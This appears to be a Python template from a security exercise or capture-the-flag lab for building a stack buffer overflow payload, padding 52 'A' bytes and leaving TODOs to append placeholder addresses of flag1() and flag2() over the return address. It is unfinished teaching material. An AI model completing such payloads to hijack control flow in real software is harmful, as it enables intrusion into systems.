import struct

# Convert integer to byte array (integer little endian).
def dw(i):
    return struct.pack("<I",i)

# TODO 1: Fill this with offset to return address location.
offset = 52

# TODO: Fill this with the address of the flag1() function.
flag1_addr = 0x0badca5e

# TODO: Fill this with the address of the flag2() function.
flag2_addr = 0xdeadc0de

# Initialize payload.
payload = ''

# Add a number of 'offset' A characters to the payload.
payload += 'A' * offset

# TODO: Add more to the payload such as the value overwriting the return address.
# Use dw() function.

with open('payload', 'wb') as f:
    f.write(payload)
